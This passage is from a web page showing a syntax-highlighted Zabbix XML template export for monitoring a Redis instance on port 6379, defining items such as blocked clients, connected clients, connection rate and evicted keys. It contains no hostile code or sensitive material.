class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br><span class=\"line\">325</span><br><span class=\"line\">326</span><br><span class=\"line\">327</span><br><span class=\"line\">328</span><br><span class=\"line\">329</span><br><span class=\"line\">330</span><br><span class=\"line\">331</span><br><span class=\"line\">332</span><br><span class=\"line\">333</span><br><span class=\"line\">334</span><br><span class=\"line\">335</span><br><span class=\"line\">336</span><br><span class=\"line\">337</span><br><span class=\"line\">338</span><br><span class=\"line\">339</span><br><span class=\"line\">340</span><br><span class=\"line\">341</span><br><span class=\"line\">342</span><br><span class=\"line\">343</span><br><span class=\"line\">344</span><br><span class=\"line\">345</span><br><span class=\"line\">346</span><br><span class=\"line\">347</span><br><span class=\"line\">348</span><br><span class=\"line\">349</span><br><span class=\"line\">350</span><br><span class=\"line\">351</span><br><span class=\"line\">352</span><br><span class=\"line\">353</span><br><span class=\"line\">354</span><br><span class=\"line\">355</span><br><span class=\"line\">356</span><br><span class=\"line\">357</span><br><span class=\"line\">358</span><br><span class=\"line\">359</span><br><span class=\"line\">360</span><br><span class=\"line\">361</span><br><span class=\"line\">362</span><br><span class=\"line\">363</span><br><span class=\"line\">364</span><br><span class=\"line\">365</span><br><span class=\"line\">366</span><br><span class=\"line\">367</span><br><span class=\"line\">368</span><br><span class=\"line\">369</span><br><span class=\"line\">370</span><br><span class=\"line\">371</span><br><span class=\"line\">372</span><br><span class=\"line\">373</span><br><span class=\"line\">374</span><br><span class=\"line\">375</span><br><span class=\"line\">376</span><br><span class=\"line\">377</span><br><span class=\"line\">378</span><br><span class=\"line\">379</span><br><span class=\"line\">380</span><br><span class=\"line\">381</span><br><span class=\"line\">382</span><br><span class=\"line\">383</span><br><span class=\"line\">384</span><br><span class=\"line\">385</span><br><span class=\"line\">386</span><br><span class=\"line\">387</span><br><span class=\"line\">388</span><br><span class=\"line\">389</span><br><span class=\"line\">390</span><br><span class=\"line\">391</span><br><span class=\"line\">392</span><br><span class=\"line\">393</span><br><span class=\"line\">394</span><br><span class=\"line\">395</span><br><span class=\"line\">396</span><br><span class=\"line\">397</span><br><span class=\"line\">398</span><br><span class=\"line\">399</span><br><span class=\"line\">400</span><br><span class=\"line\">401</span><br><span class=\"line\">402</span><br><span class=\"line\">403</span><br><span class=\"line\">404</span><br><span class=\"line\">405</span><br><span class=\"line\">406</span><br><span class=\"line\">407</span><br><span class=\"line\">408</span><br><span class=\"line\">409</span><br><span class=\"line\">410</span><br><span class=\"line\">411</span><br><span class=\"line\">412</span><br><span class=\"line\">413</span><br><span class=\"line\">414</span><br><span class=\"line\">415</span><br><span class=\"line\">416</span><br><span class=\"line\">417</span><br><span class=\"line\">418</span><br><span class=\"line\">419</span><br><span class=\"line\">420</span><br><span class=\"line\">421</span><br><span class=\"line\">422</span><br><span class=\"line\">423</span><br><span class=\"line\">424</span><br><span class=\"line\">425</span><br><span class=\"line\">426</span><br><span class=\"line\">427</span><br><span class=\"line\">428</span><br><span class=\"line\">429</span><br><span class=\"line\">430</span><br><span class=\"line\">431</span><br><span class=\"line\">432</span><br><span class=\"line\">433</span><br><span class=\"line\">434</span><br><span class=\"line\">435</span><br><span class=\"line\">436</span><br><span class=\"line\">437</span><br><span class=\"line\">438</span><br><span class=\"line\">439</span><br><span class=\"line\">440</span><br><span class=\"line\">441</span><br><span class=\"line\">442</span><br><span class=\"line\">443</span><br><span class=\"line\">444</span><br><span class=\"line\">445</span><br><span class=\"line\">446</span><br><span class=\"line\">447</span><br><span class=\"line\">448</span><br><span class=\"line\">449</span><br><span class=\"line\">450</span><br><span class=\"line\">451</span><br><span class=\"line\">452</span><br><span class=\"line\">453</span><br><span class=\"line\">454</span><br><span class=\"line\">455</span><br><span class=\"line\">456</span><br><span class=\"line\">457</span><br><span class=\"line\">458</span><br><span class=\"line\">459</span><br><span class=\"line\">460</span><br><span class=\"line\">461</span><br><span class=\"line\">462</span><br><span class=\"line\">463</span><br><span class=\"line\">464</span><br><span class=\"line\">465</span><br><span class=\"line\">466</span><br><span class=\"line\">467</span><br><span class=\"line\">468</span><br><span class=\"line\">469</span><br><span class=\"line\">470</span><br><span class=\"line\">471</span><br><span class=\"line\">472</span><br><span class=\"line\">473</span><br><span class=\"line\">474</span><br><span class=\"line\">475</span><br><span class=\"line\">476</span><br><span class=\"line\">477</span><br><span class=\"line\">478</span><br><span class=\"line\">479</span><br><span class=\"line\">480</span><br><span class=\"line\">481</span><br><span class=\"line\">482</span><br><span class=\"line\">483</span><br><span class=\"line\">484</span><br><span class=\"line\">485</span><br><span class=\"line\">486</span><br><span class=\"line\">487</span><br><span class=\"line\">488</span><br><span class=\"line\">489</span><br><span class=\"line\">490</span><br><span class=\"line\">491</span><br><span class=\"line\">492</span><br><span class=\"line\">493</span><br><span class=\"line\">494</span><br><span class=\"line\">495</span><br><span class=\"line\">496</span><br><span class=\"line\">497</span><br><span class=\"line\">498</span><br><span class=\"line\">499</span><br><span class=\"line\">500</span><br><span class=\"line\">501</span><br><span class=\"line\">502</span><br><span class=\"line\">503</span><br><span class=\"line\">504</span><br><span class=\"line\">505</span><br><span class=\"line\">506</span><br><span class=\"line\">507</span><br><span class=\"line\">508</span><br><span class=\"line\">509</span><br><span class=\"line\">510</span><br><span class=\"line\">511</span><br><span class=\"line\">512</span><br><span class=\"line\">513</span><br><span class=\"line\">514</span><br><span class=\"line\">515</span><br><span class=\"line\">516</span><br><span class=\"line\">517</span><br><span class=\"line\">518</span><br><span class=\"line\">519</span><br><span class=\"line\">520</span><br><span class=\"line\">521</span><br><span class=\"line\">522</span><br><span class=\"line\">523</span><br><span class=\"line\">524</span><br><span class=\"line\">525</span><br><span class=\"line\">526</span><br><span class=\"line\">527</span><br><span class=\"line\">528</span><br><span class=\"line\">529</span><br><span class=\"line\">530</span><br><span class=\"line\">531</span><br><span class=\"line\">532</span><br><span class=\"line\">533</span><br><span class=\"line\">534</span><br><span class=\"line\">535</span><br><span class=\"line\">536</span><br><span class=\"line\">537</span><br><span class=\"line\">538</span><br><span class=\"line\">539</span><br><span class=\"line\">540</span><br><span class=\"line\">541</span><br><span class=\"line\">542</span><br><span class=\"line\">543</span><br><span class=\"line\">544</span><br><span class=\"line\">545</span><br><span class=\"line\">546</span><br><span class=\"line\">547</span><br><span class=\"line\">548</span><br><span class=\"line\">549</span><br><span class=\"line\">550</span><br><span class=\"line\">551</span><br><span class=\"line\">552</span><br><span class=\"line\">553</span><br><span class=\"line\">554</span><br><span class=\"line\">555</span><br><span class=\"line\">556</span><br><span class=\"line\">557</span><br><span class=\"line\">558</span><br><span class=\"line\">559</span><br><span class=\"line\">560</span><br><span class=\"line\">561</span><br><span class=\"line\">562</span><br><span class=\"line\">563</span><br><span class=\"line\">564</span><br><span class=\"line\">565</span><br><span class=\"line\">566</span><br><span class=\"line\">567</span><br><span class=\"line\">568</span><br><span class=\"line\">569</span><br><span class=\"line\">570</span><br><span class=\"line\">571</span><br><span class=\"line\">572</span><br><span class=\"line\">573</span><br><span class=\"line\">574</span><br><span class=\"line\">575</span><br><span class=\"line\">576</span><br><span class=\"line\">577</span><br><span class=\"line\">578</span><br><span class=\"line\">579</span><br><span class=\"line\">580</span><br><span class=\"line\">581</span><br><span class=\"line\">582</span><br><span class=\"line\">583</span><br><span class=\"line\">584</span><br><span class=\"line\">585</span><br><span class=\"line\">586</span><br><span class=\"line\">587</span><br><span class=\"line\">588</span><br><span class=\"line\">589</span><br><span class=\"line\">590</span><br><span class=\"line\">591</span><br><span class=\"line\">592</span><br><span class=\"line\">593</span><br><span class=\"line\">594</span><br><span class=\"line\">595</span><br><span class=\"line\">596</span><br><span class=\"line\">597</span><br><span class=\"line\">598</span><br><span class=\"line\">599</span><br><span class=\"line\">600</span><br><span class=\"line\">601</span><br><span class=\"line\">602</span><br><span class=\"line\">603</span><br><span class=\"line\">604</span><br><span class=\"line\">605</span><br><span class=\"line\">606</span><br><span class=\"line\">607</span><br><span class=\"line\">608</span><br><span class=\"line\">609</span><br><span class=\"line\">610</span><br><span class=\"line\">611</span><br><span class=\"line\">612</span><br><span class=\"line\">613</span><br><span class=\"line\">614</span><br><span class=\"line\">615</span><br><span class=\"line\">616</span><br><span class=\"line\">617</span><br><span class=\"line\">618</span><br><span class=\"line\">619</span><br><span class=\"line\">620</span><br><span class=\"line\">621</span><br><span class=\"line\">622</span><br><span class=\"line\">623</span><br><span class=\"line\">624</span><br><span class=\"line\">625</span><br><span class=\"line\">626</span><br><span class=\"line\">627</span><br><span class=\"line\">628</span><br><span class=\"line\">629</span><br><span class=\"line\">630</span><br><span class=\"line\">631</span><br><span class=\"line\">632</span><br><span class=\"line\">633</span><br><span class=\"line\">634</span><br><span class=\"line\">635</span><br><span class=\"line\">636</span><br><span class=\"line\">637</span><br><span class=\"line\">638</span><br><span class=\"line\">639</span><br><span class=\"line\">640</span><br><span class=\"line\">641</span><br><span class=\"line\">642</span><br><span class=\"line\">643</span><br><span class=\"line\">644</span><br><span class=\"line\">645</span><br><span class=\"line\">646</span><br><span class=\"line\">647</span><br><span class=\"line\">648</span><br><span class=\"line\">649</span><br><span class=\"line\">650</span><br><span class=\"line\">651</span><br><span class=\"line\">652</span><br><span class=\"line\">653</span><br><span class=\"line\">654</span><br><span class=\"line\">655</span><br><span class=\"line\">656</span><br><span class=\"line\">657</span><br><span class=\"line\">658</span><br><span class=\"line\">659</span><br><span class=\"line\">660</span><br><span class=\"line\">661</span><br><span class=\"line\">662</span><br><span class=\"line\">663</span><br><span class=\"line\">664</span><br><span class=\"line\">665</span><br><span class=\"line\">666</span><br><span class=\"line\">667</span><br><span class=\"line\">668</span><br><span class=\"line\">669</span><br><span class=\"line\">670</span><br><span class=\"line\">671</span><br><span class=\"line\">672</span><br><span class=\"line\">673</span><br><span class=\"line\">674</span><br><span class=\"line\">675</span><br><span class=\"line\">676</span><br><span class=\"line\">677</span><br><span class=\"line\">678</span><br><span class=\"line\">679</span><br><span class=\"line\">680</span><br><span class=\"line\">681</span><br><span class=\"line\">682</span><br><span class=\"line\">683</span><br><span class=\"line\">684</span><br><span class=\"line\">685</span><br><span class=\"line\">686</span><br><span class=\"line\">687</span><br><span class=\"line\">688</span><br><span class=\"line\">689</span><br><span class=\"line\">690</span><br><span class=\"line\">691</span><br><span class=\"line\">692</span><br><span class=\"line\">693</span><br><span class=\"line\">694</span><br><span class=\"line\">695</span><br><span class=\"line\">696</span><br><span class=\"line\">697</span><br><span class=\"line\">698</span><br><span class=\"line\">699</span><br><span class=\"line\">700</span><br><span class=\"line\">701</span><br><span class=\"line\">702</span><br><span class=\"line\">703</span><br><span class=\"line\">704</span><br><span class=\"line\">705</span><br><span class=\"line\">706</span><br><span class=\"line\">707</span><br><span class=\"line\">708</span><br><span class=\"line\">709</span><br><span class=\"line\">710</span><br><span class=\"line\">711</span><br><span class=\"line\">712</span><br><span class=\"line\">713</span><br><span class=\"line\">714</span><br><span class=\"line\">715</span><br><span class=\"line\">716</span><br><span class=\"line\">717</span><br><span class=\"line\">718</span><br><span class=\"line\">719</span><br><span class=\"line\">720</span><br><span class=\"line\">721</span><br><span class=\"line\">722</span><br><span class=\"line\">723</span><br><span class=\"line\">724</span><br><span class=\"line\">725</span><br><span class=\"line\">726</span><br><span class=\"line\">727</span><br><span class=\"line\">728</span><br><span class=\"line\">729</span><br><span class=\"line\">730</span><br><span class=\"line\">731</span><br><span class=\"line\">732</span><br><span class=\"line\">733</span><br><span class=\"line\">734</span><br><span class=\"line\">735</span><br><span class=\"line\">736</span><br><span class=\"line\">737</span><br><span class=\"line\">738</span><br><span class=\"line\">739</span><br><span class=\"line\">740</span><br><span class=\"line\">741</span><br><span class=\"line\">742</span><br><span class=\"line\">743</span><br><span class=\"line\">744</span><br><span class=\"line\">745</span><br><span class=\"line\">746</span><br><span class=\"line\">747</span><br><span class=\"line\">748</span><br><span class=\"line\">749</span><br><span class=\"line\">750</span><br><span class=\"line\">751</span><br><span class=\"line\">752</span><br><span class=\"line\">753</span><br><span class=\"line\">754</span><br><span class=\"line\">755</span><br><span class=\"line\">756</span><br><span class=\"line\">757</span><br><span class=\"line\">758</span><br><span class=\"line\">759</span><br><span class=\"line\">760</span><br><span class=\"line\">761</span><br><span class=\"line\">762</span><br><span class=\"line\">763</span><br><span class=\"line\">764</span><br><span class=\"line\">765</span><br><span class=\"line\">766</span><br><span class=\"line\">767</span><br><span class=\"line\">768</span><br><span class=\"line\">769</span><br><span class=\"line\">770</span><br><span class=\"line\">771</span><br><span class=\"line\">772</span><br><span class=\"line\">773</span><br><span class=\"line\">774</span><br><span class=\"line\">775</span><br><span class=\"line\">776</span><br><span class=\"line\">777</span><br><span class=\"line\">778</span><br><span class=\"line\">779</span><br><span class=\"line\">780</span><br><span class=\"line\">781</span><br><span class=\"line\">782</span><br><span class=\"line\">783</span><br><span class=\"line\">784</span><br><span class=\"line\">785</span><br><span class=\"line\">786</span><br><span class=\"line\">787</span><br><span class=\"line\">788</span><br><span class=\"line\">789</span><br><span class=\"line\">790</span><br><span class=\"line\">791</span><br><span class=\"line\">792</span><br><span class=\"line\">793</span><br><span class=\"line\">794</span><br><span class=\"line\">795</span><br><span class=\"line\">796</span><br><span class=\"line\">797</span><br><span class=\"line\">798</span><br><span class=\"line\">799</span><br><span class=\"line\">800</span><br><span class=\"line\">801</span><br><span class=\"line\">802</span><br><span class=\"line\">803</span><br><span class=\"line\">804</span><br><span class=\"line\">805</span><br><span class=\"line\">806</span><br><span class=\"line\">807</span><br><span class=\"line\">808</span><br><span class=\"line\">809</span><br><span class=\"line\">810</span><br><span class=\"line\">811</span><br><span class=\"line\">812</span><br><span class=\"line\">813</span><br><span class=\"line\">814</span><br><span class=\"line\">815</span><br><span class=\"line\">816</span><br><span class=\"line\">817</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span> encoding=<span class=\"string\">&quot;UTF-8&quot;</span>?&gt;</span><br><span class=\"line\">&lt;zabbix_<span class=\"built_in\">export</span>&gt;</span><br><span class=\"line\">    &lt;version&gt;2.0&lt;/version&gt;</span><br><span class=\"line\">    &lt;date&gt;2014-02-20T12:21:39Z&lt;/date&gt;</span><br><span class=\"line\">    &lt;groups&gt;</span><br><span class=\"line\">        &lt;group&gt;</span><br><span class=\"line\">            &lt;name&gt;Templates&lt;/name&gt;</span><br><span class=\"line\">        &lt;/group&gt;</span><br><span class=\"line\">    &lt;/groups&gt;</span><br><span class=\"line\">    &lt;templates&gt;</span><br><span class=\"line\">        &lt;template&gt;</span><br><span class=\"line\">            &lt;template&gt;Templates Redis_6379&lt;/template&gt;</span><br><span class=\"line\">            &lt;name&gt;Templates Redis_6379&lt;/name&gt;</span><br><span class=\"line\">            &lt;groups&gt;</span><br><span class=\"line\">                &lt;group&gt;</span><br><span class=\"line\">                    &lt;name&gt;Templates&lt;/name&gt;</span><br><span class=\"line\">                &lt;/group&gt;</span><br><span class=\"line\">            &lt;/groups&gt;</span><br><span class=\"line\">            &lt;applications&gt;</span><br><span class=\"line\">                &lt;application&gt;</span><br><span class=\"line\">                    &lt;name&gt;Redis_6379&lt;/name&gt;</span><br><span class=\"line\">                &lt;/application&gt;</span><br><span class=\"line\">            &lt;/applications&gt;</span><br><span class=\"line\">            &lt;items&gt;</span><br><span class=\"line\">                &lt;item&gt;</span><br><span class=\"line\">                    &lt;name&gt;Blocked clients_6379&lt;/name&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;snmp_community/&gt;</span><br><span class=\"line\">                    &lt;multiplier&gt;0&lt;/multiplier&gt;</span><br><span class=\"line\">                    &lt;snmp_oid/&gt;</span><br><span class=\"line\">                    &lt;key&gt;redis_stats[6379,blocked_clients]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;delay&gt;60&lt;/delay&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">history</span>&gt;7&lt;/<span class=\"built_in\">history</span>&gt;</span><br><span class=\"line\">                    &lt;trends&gt;365&lt;/trends&gt;</span><br><span class=\"line\">                    &lt;status&gt;0&lt;/status&gt;</span><br><span class=\"line\">                    &lt;value_<span class=\"built_in\">type</span>&gt;3&lt;/value_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;allowed_hosts/&gt;</span><br><span class=\"line\">                    &lt;units/&gt;</span><br><span class=\"line\">                    &lt;delta&gt;0&lt;/delta&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securityname/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt;</span><br><span class=\"line\">                    &lt;snmpv3_authpassphrase/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_privpassphrase/&gt;</span><br><span class=\"line\">                    &lt;formula&gt;1&lt;/formula&gt;</span><br><span class=\"line\">                    &lt;delay_flex/&gt;</span><br><span class=\"line\">                    &lt;params/&gt;</span><br><span class=\"line\">                    &lt;ipmi_sensor/&gt;</span><br><span class=\"line\">                    &lt;data_<span class=\"built_in\">type</span>&gt;0&lt;/data_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;authtype&gt;0&lt;/authtype&gt;</span><br><span class=\"line\">                    &lt;username/&gt;</span><br><span class=\"line\">                    &lt;password/&gt;</span><br><span class=\"line\">                    &lt;publickey/&gt;</span><br><span class=\"line\">                    &lt;privatekey/&gt;</span><br><span class=\"line\">                    &lt;port/&gt;</span><br><span class=\"line\">                    &lt;description/&gt;</span><br><span class=\"line\">                    &lt;inventory_link&gt;0&lt;/inventory_link&gt;</span><br><span class=\"line\">                    &lt;applications&gt;</span><br><span class=\"line\">                        &lt;application&gt;</span><br><span class=\"line\">                            &lt;name&gt;Redis_6379&lt;/name&gt;</span><br><span class=\"line\">                        &lt;/application&gt;</span><br><span class=\"line\">                    &lt;/applications&gt;</span><br><span class=\"line\">                    &lt;valuemap/&gt;</span><br><span class=\"line\">                &lt;/item&gt;</span><br><span class=\"line\">                &lt;item&gt;</span><br><span class=\"line\">                    &lt;name&gt;Connected clients_6379&lt;/name&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;snmp_community/&gt;</span><br><span class=\"line\">                    &lt;multiplier&gt;0&lt;/multiplier&gt;</span><br><span class=\"line\">                    &lt;snmp_oid/&gt;</span><br><span class=\"line\">                    &lt;key&gt;redis_stats[6379,connected_clients]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;delay&gt;60&lt;/delay&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">history</span>&gt;7&lt;/<span class=\"built_in\">history</span>&gt;</span><br><span class=\"line\">                    &lt;trends&gt;365&lt;/trends&gt;</span><br><span class=\"line\">                    &lt;status&gt;0&lt;/status&gt;</span><br><span class=\"line\">                    &lt;value_<span class=\"built_in\">type</span>&gt;3&lt;/value_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;allowed_hosts/&gt;</span><br><span class=\"line\">                    &lt;units/&gt;</span><br><span class=\"line\">                    &lt;delta&gt;0&lt;/delta&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securityname/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt;</span><br><span class=\"line\">                    &lt;snmpv3_authpassphrase/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_privpassphrase/&gt;</span><br><span class=\"line\">                    &lt;formula&gt;1&lt;/formula&gt;</span><br><span class=\"line\">                    &lt;delay_flex/&gt;</span><br><span class=\"line\">                    &lt;params/&gt;</span><br><span class=\"line\">                    &lt;ipmi_sensor/&gt;</span><br><span class=\"line\">                    &lt;data_<span class=\"built_in\">type</span>&gt;0&lt;/data_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;authtype&gt;0&lt;/authtype&gt;</span><br><span class=\"line\">                    &lt;username/&gt;</span><br><span class=\"line\">                    &lt;password/&gt;</span><br><span class=\"line\">                    &lt;publickey/&gt;</span><br><span class=\"line\">                    &lt;privatekey/&gt;</span><br><span class=\"line\">                    &lt;port/&gt;</span><br><span class=\"line\">                    &lt;description/&gt;</span><br><span class=\"line\">                    &lt;inventory_link&gt;0&lt;/inventory_link&gt;</span><br><span class=\"line\">                    &lt;applications&gt;</span><br><span class=\"line\">                        &lt;application&gt;</span><br><span class=\"line\">                            &lt;name&gt;Redis_6379&lt;/name&gt;</span><br><span class=\"line\">                        &lt;/application&gt;</span><br><span class=\"line\">                    &lt;/applications&gt;</span><br><span class=\"line\">                    &lt;valuemap/&gt;</span><br><span class=\"line\">                &lt;/item&gt;</span><br><span class=\"line\">                &lt;item&gt;</span><br><span class=\"line\">                    &lt;name&gt;Connected slave_6380&lt;/name&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;snmp_community/&gt;</span><br><span class=\"line\">                    &lt;multiplier&gt;0&lt;/multiplier&gt;</span><br><span class=\"line\">                    &lt;snmp_oid/&gt;</span><br><span class=\"line\">                    &lt;key&gt;redis_stats[6379,connected_slave]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;delay&gt;60&lt;/delay&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">history</span>&gt;7&lt;/<span class=\"built_in\">history</span>&gt;</span><br><span class=\"line\">                    &lt;trends&gt;365&lt;/trends&gt;</span><br><span class=\"line\">                    &lt;status&gt;0&lt;/status&gt;</span><br><span class=\"line\">                    &lt;value_<span class=\"built_in\">type</span>&gt;3&lt;/value_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;allowed_hosts/&gt;</span><br><span class=\"line\">                    &lt;units/&gt;</span><br><span class=\"line\">                    &lt;delta&gt;0&lt;/delta&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securityname/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt;</span><br><span class=\"line\">                    &lt;snmpv3_authpassphrase/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_privpassphrase/&gt;</span><br><span class=\"line\">                    &lt;formula&gt;1&lt;/formula&gt;</span><br><span class=\"line\">                    &lt;delay_flex/&gt;</span><br><span class=\"line\">                    &lt;params/&gt;</span><br><span class=\"line\">                    &lt;ipmi_sensor/&gt;</span><br><span class=\"line\">                    &lt;data_<span class=\"built_in\">type</span>&gt;0&lt;/data_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;authtype&gt;0&lt;/authtype&gt;</span><br><span class=\"line\">                    &lt;username/&gt;</span><br><span class=\"line\">                    &lt;password/&gt;</span><br><span class=\"line\">                    &lt;publickey/&gt;</span><br><span class=\"line\">                    &lt;privatekey/&gt;</span><br><span class=\"line\">                    &lt;port/&gt;</span><br><span class=\"line\">                    &lt;description/&gt;</span><br><span class=\"line\">                    &lt;inventory_link&gt;0&lt;/inventory_link&gt;</span><br><span class=\"line\">                    &lt;applications&gt;</span><br><span class=\"line\">                        &lt;application&gt;</span><br><span class=\"line\">                            &lt;name&gt;Redis_6379&lt;/name&gt;</span><br><span class=\"line\">                        &lt;/application&gt;</span><br><span class=\"line\">                    &lt;/applications&gt;</span><br><span class=\"line\">                    &lt;valuemap/&gt;</span><br><span class=\"line\">                &lt;/item&gt;</span><br><span class=\"line\">                &lt;item&gt;</span><br><span class=\"line\">                    &lt;name&gt;Connection rate_6379&lt;/name&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;snmp_community/&gt;</span><br><span class=\"line\">                    &lt;multiplier&gt;0&lt;/multiplier&gt;</span><br><span class=\"line\">                    &lt;snmp_oid/&gt;</span><br><span class=\"line\">                    &lt;key&gt;redis_stats[6379,total_connections_received]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;delay&gt;60&lt;/delay&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">history</span>&gt;7&lt;/<span class=\"built_in\">history</span>&gt;</span><br><span class=\"line\">                    &lt;trends&gt;365&lt;/trends&gt;</span><br><span class=\"line\">                    &lt;status&gt;0&lt;/status&gt;</span><br><span class=\"line\">                    &lt;value_<span class=\"built_in\">type</span>&gt;3&lt;/value_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;allowed_hosts/&gt;</span><br><span class=\"line\">                    &lt;units/&gt;</span><br><span class=\"line\">                    &lt;delta&gt;1&lt;/delta&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securityname/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt;</span><br><span class=\"line\">                    &lt;snmpv3_authpassphrase/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_privpassphrase/&gt;</span><br><span class=\"line\">                    &lt;formula&gt;1&lt;/formula&gt;</span><br><span class=\"line\">                    &lt;delay_flex/&gt;</span><br><span class=\"line\">                    &lt;params/&gt;</span><br><span class=\"line\">                    &lt;ipmi_sensor/&gt;</span><br><span class=\"line\">                    &lt;data_<span class=\"built_in\">type</span>&gt;0&lt;/data_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;authtype&gt;0&lt;/authtype&gt;</span><br><span class=\"line\">                    &lt;username/&gt;</span><br><span class=\"line\">                    &lt;password/&gt;</span><br><span class=\"line\">                    &lt;publickey/&gt;</span><br><span class=\"line\">                    &lt;privatekey/&gt;</span><br><span class=\"line\">                    &lt;port/&gt;</span><br><span class=\"line\">                    &lt;description/&gt;</span><br><span class=\"line\">                    &lt;inventory_link&gt;0&lt;/inventory_link&gt;</span><br><span class=\"line\">                    &lt;applications&gt;</span><br><span class=\"line\">                        &lt;application&gt;</span><br><span class=\"line\">                            &lt;name&gt;Redis_6379&lt;/name&gt;</span><br><span class=\"line\">                        &lt;/application&gt;</span><br><span class=\"line\">                    &lt;/applications&gt;</span><br><span class=\"line\">                    &lt;valuemap/&gt;</span><br><span class=\"line\">                &lt;/item&gt;</span><br><span class=\"line\">                &lt;item&gt;</span><br><span class=\"line\">                    &lt;name&gt;Evicted_keys_6379&lt;/name&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;snmp_community/&gt;</span><br><span class=\"line\">                    &lt;multiplier&gt;0&lt;/multiplier&gt;</span><br><span class=\"line\">                    &lt;snmp_oid/&gt;</span><br><span class=\"line\">                    &lt;key&gt;redis_stats[6379,evicted_keys]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;delay&gt;60&lt;/delay&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">history</span>&gt;7&lt;/<span class=\"built_in\">history</span>&gt;</span><br><span class=\"line\">                    &lt;trends&gt;365&lt;/trends&gt;</span><br><span class=\"line\">                    &lt;status&gt;0&lt;/status&gt;</span><br><span class=\"line\">                    &lt;value_<span class=\"built_in\">type</span>&gt;3&lt;/value_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;allowed_hosts/&gt;</span><br><span class=\"line\">                    &lt;units/&gt;</span><br><span class=\"line\">                    &lt;delta&gt;0&lt;/delta&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securityname/&gt;</span><br><span class=\"line\">                    